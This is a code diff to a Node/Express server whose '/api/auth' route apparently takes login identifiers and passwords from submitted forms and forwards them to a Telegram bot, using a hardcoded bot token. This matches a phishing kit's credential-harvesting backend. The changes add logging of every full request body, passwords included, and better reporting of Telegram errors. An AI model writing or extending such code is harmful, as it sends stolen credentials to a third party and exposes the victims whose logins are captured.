@@ -1,3 +1,4 @@
+import "dotenv/config";
 import express from "express";
 import path from "path";
 import { createServer as createViteServer } from "vite";
@@ -11,6 +12,7 @@ async function startServer() {
 
   // API route for Authentication & Telegram Logging
   app.post("/api/auth", async (req, res) => {
+    console.log("Received auth request:", req.body);
     const { screen, method, identifier, password, extraInfo } = req.body;
 
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
@@ -28,6 +30,7 @@ async function startServer() {
     `;
 
     try {
+      console.log(`Sending message to Telegram...`);
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -38,10 +41,13 @@ async function startServer() {
         }),
       });
 
+      const data = await response.json();
       if (!response.ok) {
-        console.error("Telegram API Error:", await response.text());
+        console.error("Telegram API Error:", data);
+        return res.status(500).json({ error: "Telegram API Error", details: data });
       }
 
+      console.log("Telegram message sent successfully!");
       res.json({ status: "success" });
     } catch (error) {
       console.error("Server Error:", error);
@@ -58,16 +64,14 @@ async function startServer() {
     app.use(vite.middlewares);
   } else {
     const distPath = path.join(process.cwd(), "dist");
-    if (fs.existsSync(distPath)) {
-      app.use(express.static(distPath));
-      app.get("*", (req, res) => {
-        res.sendFile(path.join(distPath, "index.html"));
-      });
-    }
+    app.use(express.static(distPath));
+    app.get("*", (req, res) => {
+      res.sendFile(path.join(distPath, "index.html"));
+    });
   }
 
   app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on http://localhost:${PORT}`);
+    console.log(`Server running on http://localhost:${PORT} in ${process.env.NODE_ENV || 'development'} mode`);
   });
 }
 
